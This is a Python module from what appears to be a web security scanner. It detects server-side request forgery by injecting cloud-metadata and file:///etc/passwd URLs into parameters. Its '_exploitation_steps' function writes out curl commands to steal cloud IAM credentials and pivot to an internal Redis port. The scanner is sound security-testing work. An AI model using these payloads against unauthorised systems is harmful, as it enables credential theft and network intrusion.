"""
ssrf_detect — in-band detection of Server-Side Request Forgery in parameters/form fields.

It injects internal and cloud-metadata URLs and flags responses that come back containing
content only the SERVER could have fetched: AWS/GCP metadata, or /etc/passwd via file://.
URL-shaped parameters (url, uri, src, dest, callback, webhook, proxy, fetch, image, …) are
prioritised. Confirmation requires a concrete content signal — no guessing — so this is
MEDIUM with medium confidence; blind SSRF needs an out-of-band check (future).

Skipped in safe mode.
"""
from __future__ import annotations

import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import unquote

from scanner.engine import Finding, Severity, ScanEngine
from scanner.vulns._common import Injector, evidence, is_safe_mode, iter_injectors

MODULE = "ssrf_detect"

_URL_HINTS = ("url", "uri", "link", "src", "source", "dest", "redirect", "callback",
              "webhook", "proxy", "fetch", "load", "image", "img", "file", "path",
              "domain", "host", "site", "page", "feed", "data", "target", "next")

# (payload, signature regex, what it proves)
# Signatures must match content ONLY a real metadata/file response contains — never a
# substring of the payload itself (e.g. "meta-data", "computeMetadata"), or a reflected
# payload would false-positive. The injected payload is stripped from the body before
# matching as a second safeguard (see _test).
_PAYLOADS: list[tuple[str, "re.Pattern[str]", str]] = [
    ("http://169.254.169.254/latest/meta-data/",
     re.compile(r"ami-id|instance-id|iam/security-credentials|public-keys/|local-ipv4|reservation-id",
                re.I),
     "AWS instance metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/",
     re.compile(r"service-accounts/|numeric-project-id|attributes/|hostname\b", re.I),
     "GCP instance metadata"),
    ("file:///etc/passwd",
     re.compile(r"root:.*?:0:0:", re.I),
     "/etc/passwd via file://"),
]


def _is_url_param(name: str) -> bool:
    n = name.lower()
    return any(h in n for h in _URL_HINTS)


def _exploitation_steps(inj: Injector, payload: str) -> list[dict]:
    """Weaponise a confirmed SSRF: re-fetch the target, steal cloud creds, pivot internally."""
    if inj.proof is None:
        return [{"step": 1, "description": "Re-issue the confirmed SSRF payload in this form field.",
                 "command": f"<inject into {inj.label}>: {payload}"}]
    creds = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    return [
        {"step": 1, "description": "Re-trigger the SSRF to fetch the confirmed internal/metadata URL.",
         "command": f'curl -sk "{inj.proof(payload)}"'},
        {"step": 2, "description": "Steal cloud IAM credentials from the metadata endpoint.",
         "command": f'curl -sk "{inj.proof(creds)}"'},
        {"step": 3, "description": "Pivot: probe internal services/ports through the parameter.",
         "command": f'curl -sk "{inj.proof("http://127.0.0.1:6379/")}"'},
    ]


def _finding(inj: Injector, payload: str, signal: str,
             proof_lines: list[str] | None = None) -> Finding:
    proof_url = inj.proof(payload) if inj.proof else None
    return Finding(
        module=MODULE,
        title=f"Server-Side Request Forgery: {inj.param}",
        description=(f"Parameter '{inj.param}' makes the server fetch an attacker-supplied URL "
                     f"({signal}). Payload: {payload!r}. SSRF can reach internal services and cloud "
                     "metadata (stealing credentials) or pivot into the internal network."),
        severity=Severity.MEDIUM,
        recommendation=("Validate and allowlist outbound destinations, block link-local/private ranges "
                        "and non-http(s) schemes, and disable unused URL fetchers. Confirm with an "
                        "out-of-band (OOB) interaction test."),
        raw={"location": inj.label, "parameter": inj.param, "payload": payload,
             "signal": signal, "proof_url": proof_url, "confidence": "medium",
             "evidence": proof_lines or [f"injected into {inj.label}: {payload}"],
             "exploitation": _exploitation_steps(inj, payload)},
    )


def _strip_reflection(text: str, payload: str) -> str:
    """Remove the injected payload (URL-decoded) from the response so a mere reflection
    of our own URL can't be mistaken for a fetched metadata/file response."""
    decoded = unquote(text)
    return decoded.replace(payload, "").replace(unquote(payload), "")


def _test(inj: Injector) -> Finding | None:
    for payload, sig_re, signal in _PAYLOADS:
        resp = inj.inject(payload)
        if resp is None:
            continue
        body = _strip_reflection(resp.text, payload)
        # An HTML document is the app reflecting our input, not a metadata/file body.
        low = body.lower()
        if "<html" in low or "<!doctype" in low:
            continue
        if sig_re.search(body):
            return _finding(inj, payload, signal,
                            evidence(inj, payload, resp,
                                     indicator=f"server-fetched content present: {signal}"))
    return None


def run(engine: ScanEngine) -> list[Finding]:
    if is_safe_mode(engine):
        return [Finding(MODULE, "SSRF Scan Skipped (Safe Mode)",
                        "Active SSRF probing was skipped because safe mode is enabled.",
                        Severity.INFO, "Re-run without safe mode on an authorised target.",
                        {"reason": "safe_mode", "confidence": "high"})]

    injectors = iter_injectors(engine)
    if not injectors:
        return [Finding(MODULE, "SSRF: No Injectable Inputs Found",
                        "No URL parameters or form fields were discovered to test.",
                        Severity.INFO, "", {"confidence": "high"})]

    # Prioritise URL-shaped parameters first (more likely to fetch), but test all.
    injectors.sort(key=lambda i: 0 if _is_url_param(i.param) else 1)

    findings: list[Finding] = []
    with ThreadPoolExecutor(max_workers=engine.threads) as pool:
        for result in pool.map(_test, injectors):
            if result:
                findings.append(result)

    if not findings:
        return [Finding(MODULE, "SSRF: None Detected (in-band)",
                        f"Tested {len(injectors)} input(s) with metadata/file payloads. Blind SSRF "
                        "requires an out-of-band test.",
                        Severity.INFO, "", {"inputs_tested": len(injectors), "confidence": "high"})]
    return findings
